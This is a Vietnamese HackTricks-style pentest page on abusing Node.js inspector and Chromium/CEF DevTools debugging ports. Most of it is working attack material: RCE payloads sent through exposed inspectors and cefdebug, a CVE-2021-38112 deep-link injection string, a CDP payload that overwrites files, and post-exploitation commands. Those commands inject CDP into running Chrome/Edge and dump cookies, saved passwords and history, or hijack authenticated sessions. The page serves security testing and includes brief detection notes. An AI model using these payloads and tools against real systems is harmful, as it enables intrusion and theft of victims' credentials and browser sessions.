# Lạm dụng debug Node inspector/CEF

{{#include ../../banners/hacktricks-training.md}}

Các ví dụ thực tế trước đây bao gồm walkthrough Multimaster và cuộc tấn công debugger CVE-2019-1414 vào Visual Studio Code; hãy xem chúng là bối cảnh theo từng phiên bản, thay vì cho rằng mọi mục tiêu Electron hoặc Chromium hiện nay đều có cùng các primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Thông tin cơ bản

[Theo tài liệu](https://nodejs.org/learn/getting-started/debugging): Khi được khởi chạy với switch `--inspect`, một tiến trình Node.js sẽ lắng nghe kết nối từ client debug. Theo **mặc định**, tiến trình sẽ lắng nghe trên host và cổng **`127.0.0.1:9229`**. Mỗi tiến trình cũng được gán một **UUID duy nhất**.<sup>[[4]](#references)</sup>

Client inspector cần biết và chỉ định địa chỉ host, cổng và UUID để kết nối. URL đầy đủ sẽ có dạng như `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Vì **debugger có toàn quyền truy cập vào môi trường thực thi Node.js**, kẻ tấn công có thể kết nối đến cổng này có khả năng thực thi mã tùy ý dưới danh nghĩa tiến trình Node.js (**có thể leo thang đặc quyền**).<sup>[[4]](#references)</sup>

Có một số cách để khởi chạy inspector:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Khi bạn khởi chạy một tiến trình đang được kiểm tra, nội dung tương tự như sau sẽ xuất hiện:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Các process dựa trên **CEF** (**Chromium Embedded Framework**) có thể mở debugger bằng `--remote-debugging-port=9222`. Cách này expose trình duyệt thông qua [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) thay vì Node.js inspector, nên các payload dựa trên `process` của Node.js mặc định không áp dụng trực tiếp được.<sup>[[2]](#references)[[5]](#references)</sup>

Khi khởi động một trình duyệt đang được debug, bạn sẽ thấy nội dung tương tự như sau:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Liệt kê và điều khiển endpoint CDP

Các endpoint HTTP discovery phân biệt WebSocket **browser** với WebSocket của từng **target** (tab, worker, extension, v.v.). Truy vấn `/json/version` để lấy endpoint của browser và `/json/list` để lấy các target; sau đó có thể điều khiển trực tiếp các giá trị `webSocketDebuggerUrl` được trả về bằng các thông điệp dạng JSON-RPC của CDP.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Ví dụ, kết nối bằng `websocat "$BROWSER_WS"` rồi gửi `{"id":1,"method":"Target.getTargets"}` hoặc `{"id":2,"method":"Storage.getCookies"}`. Trên một page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` thực thi trong renderer đó và `Page.captureScreenshot` trả về ảnh chụp màn hình được mã hóa base64. `document.cookie` không thể tiết lộ cookie `HttpOnly`, trong khi `Storage.getCookies` yêu cầu trình duyệt truy vấn kho cookie của nó.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Trình duyệt, WebSocket và chính sách cùng nguồn gốc <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Các trang web mở trong trình duyệt có thể gửi yêu cầu WebSocket và HTTP theo mô hình bảo mật của trình duyệt. Cần có **kết nối HTTP ban đầu** để **lấy ID phiên debugger duy nhất**. **Chính sách cùng nguồn gốc** **ngăn** các trang web tạo **kết nối HTTP này**. Để tăng cường bảo mật trước [**các cuộc tấn công DNS rebinding**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js xác minh rằng **header 'Host'** của kết nối chỉ định chính xác **địa chỉ IP** hoặc **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> **Biện pháp bảo mật này ngăn việc khai thác inspector** để chạy mã chỉ bằng cách **gửi một yêu cầu HTTP** (có thể thực hiện bằng cách khai thác lỗ hổng SSRF).<sup>[[4]](#references)</sup>

### Khởi chạy inspector trong các tiến trình đang chạy

Bạn có thể gửi **tín hiệu SIGUSR1** đến một tiến trình nodejs đang chạy để khiến tiến trình đó **khởi chạy inspector** trên cổng mặc định. Tuy nhiên, hãy lưu ý rằng bạn cần có đủ quyền, vì vậy cách này có thể cấp cho bạn **quyền truy cập đặc quyền vào thông tin bên trong tiến trình**, nhưng không trực tiếp nâng cấp đặc quyền.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Điều này hữu ích trong container vì **tắt process rồi khởi động process mới** với `--inspect` **không phải là một lựa chọn**, do **container** sẽ bị **dừng** cùng với process.<sup>[[6]](#references)</sup>

### Kết nối với inspector/debugger

Để kết nối với **trình duyệt dựa trên Chromium**, có thể truy cập URL `chrome://inspect` hoặc `edge://inspect` tương ứng với Chrome hoặc Edge. Nhấp vào nút Configure để đảm bảo **host và port mục tiêu** được liệt kê chính xác. Hình ảnh minh họa một ví dụ Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Sau đó, URL để truy cập debugger sẽ xuất hiện. Ví dụ: ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Kết nối với inspector/debugger: Để kết nối với trình duyệt dựa trên Chromium,...](<../../images/image (674).png>)

Bạn có thể dùng **command line** để kết nối với debugger/inspector:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Công cụ [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) cho phép **tìm các inspector** đang chạy cục bộ và **inject code** vào chúng.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Lưu ý rằng **các khai thác NodeJS RCE sẽ không hoạt động** nếu kết nối với trình duyệt qua [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (bạn cần kiểm tra API để tìm những việc thú vị có thể thực hiện với nó).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE trong NodeJS Debugger/Inspector

> [!TIP]
> Nếu bạn đến đây để tìm cách lấy [**RCE từ một XSS trong Electron, hãy xem trang này.**](../../desktop-application-security/electron-desktop-apps/index.html)

Một số cách phổ biến để lấy **RCE** khi bạn có thể **kết nối** với Node **inspector** là sử dụng những thứ như (có vẻ cách này **sẽ không hoạt động khi kết nối với Chrome DevTools protocol**):<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Payloads của Chrome DevTools Protocol

Bạn có thể xem API tại đây: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
Trong phần này, tôi sẽ chỉ liệt kê những điều thú vị mà tôi thấy mọi người đã dùng để khai thác protocol này.

### Hạn chế hồ sơ mặc định từ Chrome 136 trở lên

Bắt đầu từ **Chrome 136**, Chrome bỏ qua `--remote-debugging-port` và `--remote-debugging-pipe` khi chúng nhắm đến **thư mục dữ liệu Chrome mặc định**. Các switch này phải được dùng cùng với một `--user-data-dir` không theo mặc định; khóa mã hóa riêng và trạng thái trình duyệt biệt lập của thư mục này ngăn kỹ thuật đơn giản dựa trên flag làm lộ hồ sơ đã xác thực thông thường của người dùng. Không nên mặc định cho rằng hạn chế riêng của Chrome này cũng áp dụng cho các bản Chrome cũ hơn, Chrome for Testing, ứng dụng Electron/CEF hoặc các biến thể Chromium khác nếu chưa xác minh.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Do đó, việc thấy một tiến trình Chrome hiện tại chỉ được khởi chạy với `--remote-debugging-port` **không** chứng minh rằng CDP đã hoạt động. Hãy xác nhận listener và `/json/version`, đồng thời xác định profile nào thực sự đang được dùng.<sup>[[14]](#references)</sup>

### Chèn tham số qua Deep Link

Trong [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/), Rhino Security phát hiện một ứng dụng dựa trên CEF đã **đăng ký một URI tùy chỉnh** trong hệ thống (workspaces://index.html). URI này nhận toàn bộ URI, sau đó **khởi chạy ứng dụng dựa trên CEF** với cấu hình được tạo một phần từ URI đó.<sup>[[8]](#references)</sup>

Họ phát hiện các tham số URI được giải mã URL và dùng để khởi chạy ứng dụng cơ bản dựa trên CEF, cho phép người dùng **chèn** flag **`--gpu-launcher`** vào **command line** và thực thi các lệnh tùy ý.<sup>[[8]](#references)</sup>

Vì vậy, một payload như sau:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Sẽ thực thi calc.exe.<sup>[[8]](#references)</sup>

### Ghi đè tệp

Thay đổi thư mục **lưu các tệp đã tải xuống**, rồi tải một tệp xuống để **ghi đè** **mã nguồn** thường được ứng dụng sử dụng bằng **mã độc** của bạn.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE và exfiltration

STAR Labs đã chỉ ra rằng các dịch vụ WebDriver/CDP bị lộ có thể cho phép đọc tệp tùy ý và RCE; DNS rebinding có thể hoàn tất chuỗi khai thác trong một số cấu hình.<sup>[[9]](#references)</sup>

Dịch vụ WebDriver của ChromeDriver khác với Chrome DevTools/CDP. Capability [`goog:chromeOptions.binary`](https://developer.chrome.com/docs/chromedriver/capabilities) chọn executable của trình duyệt được khởi chạy cho một session mới. Nếu một caller không có đặc quyền có thể truy cập dịch vụ ChromeDriver đang chạy với quyền root và gửi một session có đường dẫn executable do caller kiểm soát, lần khởi chạy đó có thể vượt qua ranh giới đặc quyền của dịch vụ. Phản hồi `/sessions` trống không đủ để kết luận rằng không thể tạo session mới. Hãy kiểm tra chủ sở hữu tiến trình, khả năng truy cập thực tế vào listener, việc xác thực session, quyền truy cập executable và cơ chế confinement trước khi kết luận rằng có thể sử dụng đường dẫn này; chỉ dựa vào tên tiến trình hoặc cổng thường dùng là chưa đủ. [Hướng dẫn bảo mật của Google](https://developer.chrome.com/docs/chromedriver/security-considerations) khuyến nghị chạy ChromeDriver bằng tài khoản không có đặc quyền. Việc enumeration thụ động không nên tạo session WebDriver.

Để xem thêm các trường hợp lịch sử về browser automation và bảo mật Chromium, hãy xem bài viết của Counter về WebDriver và các issue 773, 1742, 1944 của Project Zero.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Bật CDP bên trong tiến trình Chromium đang chạy

Giới hạn profile mặc định của Chrome chỉ chặn cách kích hoạt bằng command-line. Khi có đủ quyền truy cập cùng user để thao tác với tiến trình trình duyệt, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ban đầu và [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) của Cobalt Strike gọi `content::DevToolsAgentHost::StartRemoteDebuggingServer` không được export bên trong `chrome.exe` hoặc `msedge.exe` đang chạy. Do đó, endpoint thuộc về profile thực, giữ nguyên các tab, extension, cookie và trạng thái xác thực của profile đó.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Đối với các tiến trình Chrome/Edge x64 thông thường, BOF tìm cửa sổ trình duyệt và `chrome.dll`/`msedge.dll` đã được load, quét PE từ xa để tìm các signature có mask, cấp phát các stub và một khối context, tạm thời thay thế window procedure, rồi dispatch lời gọi cuối cùng trên **UI thread** của trình duyệt. Các đầu vào runtime liên quan là `StartRemoteDebuggingServer`, `operator new` của Chromium, `TCPServerSocketFactory::CreateForHttpServer` và vtable của factory. Việc thực thi sẽ dừng nếu bất kỳ signature bắt buộc nào không có kết quả khớp duy nhất.<sup>[[15]](#references)[[16]](#references)</sup>

BOF nhận chế độ trình duyệt và cổng tùy chọn. Sau đó, script helper có thể xác minh endpoint và thu thập cookie; `chrome-iso` là một phương thức riêng để vượt qua ranh giới Windows Process Isolation của Chrome.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

The `chrome-iso` path chỉ sử dụng các handle chỉ có quyền truy vấn tới tiến trình cô lập. Nó xác định `chrome.dll` đã cài đặt có kích thước image PE khớp với tiến trình đang chạy, phân giải symbol từ image cục bộ đó, rồi sử dụng cơ chế dispatch `WindowImpl` của Chromium cùng `WM_COPYDATA` đồng bộ và một hook User32 trong image hiện có để tiếp cận UI thread.<sup>[[16]](#references)</sup>

> [!WARNING]
> Đây là kỹ thuật **thao túng tiến trình trình duyệt sau khi đã xâm nhập**, không phải cách bypass mạng unauthenticated. Kỹ thuật này phụ thuộc vào build vì các symbol C++ liên quan không được export và có thể thay đổi sau các bản cập nhật trình duyệt.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Làm mới signature sau khi cập nhật trình duyệt

Sử dụng đúng phiên bản `chrome.dll` hoặc `msedge.dll` được cài đặt trên mục tiêu cùng với PDB tương ứng. `symchk.exe` trong Windows SDK sẽ tải symbol; sau đó, các script trong repository tìm `StartRemoteDebuggingServer`, suy ra đầu vào của allocator/socket-factory hoặc xác thực mọi signature được nhúng trong BOF.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

Kết quả không tìm thấy hoặc tìm thấy nhiều kết quả không được thay bằng một địa chỉ tùy ý. Nếu mẫu `operator new` hoặc `CreateForHttpServer` đã thay đổi quá nhiều để tạo mask mới, hãy dùng `pe_signature_finder.py` cùng với PDB để kiểm tra symbol đó và tìm ra một chuỗi byte duy nhất trong module đích.<sup>[[16]](#references)[[18]](#references)</sup>

#### Trích xuất từ trình duyệt đã xác thực bằng CDP Toolkit

Kỹ thuật này không giải mã App-Bound Encryption (ABE) ngoại tuyến hoặc loại bỏ ràng buộc với thiết bị. Thay vào đó, kỹ thuật này coi trình duyệt hợp lệ như một **oracle giải mã và proxy tương tác đã xác thực**: `Storage.getCookies` yêu cầu trình duyệt đang chạy cung cấp dữ liệu cookie, trong khi các quy trình điều hướng/screencast giữ cho yêu cầu, bộ nhớ, xác thực doanh nghiệp và hành vi gắn với thiết bị nằm trong trình duyệt hiện có của nạn nhân.<sup>[[17]](#references)[[18]](#references)</sup>

Sau khi định tuyến listener CDP trên loopback qua pivot của operator, [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) có thể liệt kê và thu thập các artifact phổ biến.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` và `tabs screenshot` chủ yếu là các wrapper quanh `/json/version`, danh sách target, `Storage.getCookies` và `Page.captureScreenshot`. Trong khi đó, History, bookmarks, extensions và metadata mật khẩu cần một target WebUI `chrome://`/`edge://` tạm thời: toolkit chờ giao diện hiển thị, kiểm tra model hoặc DOM, thu thập kết quả rồi đóng target.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` đi xa hơn: mở origin chứa thông tin đăng nhập đã lưu thực tế, focus vào trường thông tin đăng nhập, chọn gợi ý autofill gốc bằng các sự kiện input CDP rồi đọc các giá trị đã điền. Origin/port/path phải khớp sát với realm của mật khẩu đã lưu; chế độ hiển thị là lựa chọn mặc định đáng tin cậy vì popup gợi ý là giao diện gốc của trình duyệt.<sup>[[17]](#references)[[18]](#references)</sup>

Để tương tác trực tiếp, `browser-takeover screencast` truyền các khung hình và gửi input đến một target thực (kể cả ở chế độ nền hoặc ngoài màn hình). `browser-takeover proxy` thay vào đó nhận HTTP và HTTPS `CONNECT` cục bộ rồi gửi các request upstream qua các target Chrome ẩn, chuyển sang dùng tab nền khi không có target ẩn; cách này giữ nguyên ngữ cảnh mạng/xác thực của nạn nhân nhưng kém trung thực hơn với các ứng dụng client-side phức tạp vì trình duyệt của operator sẽ render nội dung được trả về.<sup>[[17]](#references)[[18]](#references)</sup>

Để phát hiện, đừng chỉ dựa vào telemetry dòng lệnh `--remote-debugging-*`: hãy đối chiếu thêm các handle bất thường và thao tác bộ nhớ nhắm vào tiến trình trình duyệt (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, tạo thread), DLL injection và các socket lắng nghe loopback bất thường do Chrome/Edge sở hữu.<sup>[[15]](#references)</sup>

### Post-Exploitation

Trong môi trường thực tế, **sau khi xâm nhập** một PC của người dùng có sử dụng trình duyệt dựa trên Chromium, một kỹ thuật trước đây là khởi chạy lại trình duyệt với debugging được bật và chuyển tiếp cổng loopback. Cách này có thể làm lộ trạng thái duyệt web của nạn nhân trên các sản phẩm/bản dựng vẫn chấp nhận profile được chọn, nhưng Chrome 136+ sẽ không áp dụng cách này với thư mục dữ liệu mặc định của nó.<sup>[[7]](#references)[[14]](#references)</sup>

Lệnh khởi chạy lại ban đầu được giữ bên dưới để dùng cho các target cũ/phiên bản cụ thể. Lệnh thứ hai là cách được Chrome hiện tại hỗ trợ, nhưng tạo một profile biệt lập thay vì mở lại trạng thái xác thực thông thường của nạn nhân.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Để xem tradecraft đặc thù cho macOS về khởi chạy lại Chromium, extension và CDP, hãy xem [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - Công cụ kiểm tra và khai thác debugger CEF/Chromium](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Thực thi mã từ xa qua Chrome DevTools Debugger trong Visual Studio Code](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Hướng dẫn Debugging Node.js - Bắt đầu](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [Bài viết về corCTF 2021 - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Lạm dụng tính năng Debugging của Chrome để theo dõi và điều khiển từ xa các phiên duyệt web](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: Thực thi mã từ xa trong AWS WorkSpaces](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Bạn đang nói chuyện với tôi à? - WebDriver RCE qua DNS Rebinding và CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Từ Bot đến RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (trình theo dõi lỗi Chromium)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Các thay đổi đối với tùy chọn remote debugging nhằm tăng cường bảo mật - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP vào trình duyệt Edge đang chạy: Phân tích chuyên sâu về việc instrument trình duyệt trong Runtime](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Cookie Monster trở lại](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
